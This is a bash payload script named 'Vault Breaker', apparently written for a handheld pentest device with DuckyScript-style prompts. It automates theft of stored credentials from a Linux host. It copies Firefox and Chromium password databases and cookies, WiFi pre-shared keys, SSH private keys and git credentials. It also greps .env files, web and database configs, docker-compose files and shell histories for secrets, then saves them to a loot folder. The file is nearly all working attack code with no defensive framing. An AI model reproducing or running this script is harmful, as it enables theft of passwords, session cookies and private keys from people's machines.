#!/bin/bash
# Title: Vault Breaker
# Author: bad-antics
# Description: Automated password vault and credential store extraction
# Category: nullsec/crack

LOOT_DIR="/mmc/nullsec/vault-breaker"
mkdir -p "$LOOT_DIR"

PROMPT "VAULT BREAKER

Credential store extractor.

Targets:
- Browser saved passwords
- WiFi stored credentials
- SSH keys & configs
- .env / config files
- Database connection strings
- API keys & tokens
- Password manager exports

Press OK to begin."

PROMPT "TARGET TYPE

1. Browser credentials
2. WiFi passwords
3. SSH keys & configs
4. Config file secrets
5. ALL (full vault sweep)

Select on next screen."

MODE=$(NUMBER_PICKER "Mode (1-5):" 5)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MODE=5 ;; esac

resp=$(CONFIRMATION_DIALOG "START EXTRACTION?

Mode: $MODE
Output: vault-breaker/

Press OK to begin.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "VaultBreaker: mode=$MODE"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
VAULT="$LOOT_DIR/vault_${TIMESTAMP}"
mkdir -p "$VAULT"
SPINNER_START "Breaking vaults..."

extract_browser() {
    echo "=== BROWSER CREDENTIALS ===" > "$VAULT/browsers.txt"
    
    # Firefox profiles
    FF_DIR="$HOME/.mozilla/firefox"
    if [ -d "$FF_DIR" ]; then
        echo "--- Firefox ---" >> "$VAULT/browsers.txt"
        find "$FF_DIR" -name "logins.json" -exec cp {} "$VAULT/" \; 2>/dev/null
        find "$FF_DIR" -name "key4.db" -exec cp {} "$VAULT/" \; 2>/dev/null
        find "$FF_DIR" -name "cookies.sqlite" -exec cp {} "$VAULT/" \; 2>/dev/null
        PROFILES=$(find "$FF_DIR" -name "logins.json" 2>/dev/null | wc -l)
        echo "Profiles found: $PROFILES" >> "$VAULT/browsers.txt"
    fi
    
    # Chromium-based
    for browser in google-chrome chromium BraveSoftware/Brave-Browser; do
        CHROME_DIR="$HOME/.config/$browser"
        [ -d "$CHROME_DIR" ] || continue
        echo "--- $browser ---" >> "$VAULT/browsers.txt"
        find "$CHROME_DIR" -name "Login Data" -exec cp {} "$VAULT/${browser//\//_}_logins.db" \; 2>/dev/null
        find "$CHROME_DIR" -name "Cookies" -exec cp {} "$VAULT/${browser//\//_}_cookies.db" \; 2>/dev/null
        find "$CHROME_DIR" -name "Web Data" -exec cp {} "$VAULT/${browser//\//_}_webdata.db" \; 2>/dev/null
    done
}

extract_wifi() {
    echo "=== WIFI PASSWORDS ===" > "$VAULT/wifi.txt"
    
    # NetworkManager stored connections
    if [ -d /etc/NetworkManager/system-connections ]; then
        for f in /etc/NetworkManager/system-connections/*; do
            SSID=$(grep -oP "(?<=ssid=).*" "$f" 2>/dev/null)
            PSK=$(grep -oP "(?<=psk=).*" "$f" 2>/dev/null)
            [ -n "$SSID" ] && echo "  $SSID | $PSK" >> "$VAULT/wifi.txt"
        done
    fi
    
    # wpa_supplicant
    if [ -f /etc/wpa_supplicant/wpa_supplicant.conf ]; then
        grep -A3 "network=" /etc/wpa_supplicant/wpa_supplicant.conf 2>/dev/null >> "$VAULT/wifi.txt"
    fi
    
    # iwctl (iwd)
    find /var/lib/iwd -name "*.psk" 2>/dev/null -exec cat {} \; >> "$VAULT/wifi.txt"
}

extract_ssh() {
    echo "=== SSH KEYS & CONFIGS ===" > "$VAULT/ssh_audit.txt"
    
    # SSH keys
    find "$HOME/.ssh" -name "id_*" ! -name "*.pub" 2>/dev/null | while read -r key; do
        echo "Private key: $key" >> "$VAULT/ssh_audit.txt"
        cp "$key" "$VAULT/$(basename "$key")" 2>/dev/null
    done
    
    # SSH config
    [ -f "$HOME/.ssh/config" ] && cp "$HOME/.ssh/config" "$VAULT/ssh_config" 2>/dev/null
    
    # Known hosts
    [ -f "$HOME/.ssh/known_hosts" ] && cp "$HOME/.ssh/known_hosts" "$VAULT/" 2>/dev/null
    
    # Authorized keys
    [ -f "$HOME/.ssh/authorized_keys" ] && cp "$HOME/.ssh/authorized_keys" "$VAULT/" 2>/dev/null
    
    echo "Keys found: $(find "$HOME/.ssh" -name "id_*" ! -name "*.pub" 2>/dev/null | wc -l)" >> "$VAULT/ssh_audit.txt"
}

extract_configs() {
    echo "=== CONFIG FILE SECRETS ===" > "$VAULT/configs.txt"
    
    # .env files
    find "$HOME" /var/www /opt -maxdepth 4 -name ".env" -o -name ".env.local" -o -name ".env.production" 2>/dev/null | \
    while read -r f; do
        echo "--- $f ---" >> "$VAULT/configs.txt"
        grep -iE "pass|key|secret|token|api|auth|credential|database_url|connection" "$f" 2>/dev/null >> "$VAULT/configs.txt"
    done
    
    # Database configs
    find "$HOME" /etc /var/www -maxdepth 4 \( -name "database.yml" -o -name "db.conf" -o -name "wp-config.php" -o -name "settings.py" \) 2>/dev/null | \
    while read -r f; do
        echo "--- $f ---" >> "$VAULT/configs.txt"
        grep -iE "password|pass|secret|key" "$f" 2>/dev/null >> "$VAULT/configs.txt"
    done
    
    # Git credentials
    [ -f "$HOME/.git-credentials" ] && { echo "--- Git Credentials ---" >> "$VAULT/configs.txt"; cat "$HOME/.git-credentials" >> "$VAULT/configs.txt"; }
    
    # History files for leaked creds
    for hist in "$HOME/.bash_history" "$HOME/.zsh_history"; do
        [ -f "$hist" ] && grep -iE "password|passwd|token|secret|api.key|curl.*-u|wget.*--password" "$hist" 2>/dev/null >> "$VAULT/configs.txt"
    done
    
    # Docker env
    find "$HOME" -maxdepth 3 -name "docker-compose.yml" -o -name "docker-compose.yaml" 2>/dev/null | \
    while read -r f; do
        grep -iE "password|secret|key|token" "$f" 2>/dev/null >> "$VAULT/configs.txt"
    done
}

case $MODE in
    1) extract_browser ;;
    2) extract_wifi ;;
    3) extract_ssh ;;
    4) extract_configs ;;
    5) extract_browser; extract_wifi; extract_ssh; extract_configs ;;
esac

SPINNER_STOP

TOTAL_FILES=$(find "$VAULT" -type f | wc -l)
TOTAL_SIZE=$(du -sh "$VAULT" | cut -f1)
CRED_LINES=$(cat "$VAULT"/*.txt 2>/dev/null | grep -ciE "pass|key|secret|token")

PROMPT "VAULT BROKEN

Files extracted: $TOTAL_FILES
Total size: $TOTAL_SIZE
Secrets found: $CRED_LINES

Saved to vault-breaker/

Press OK to exit."
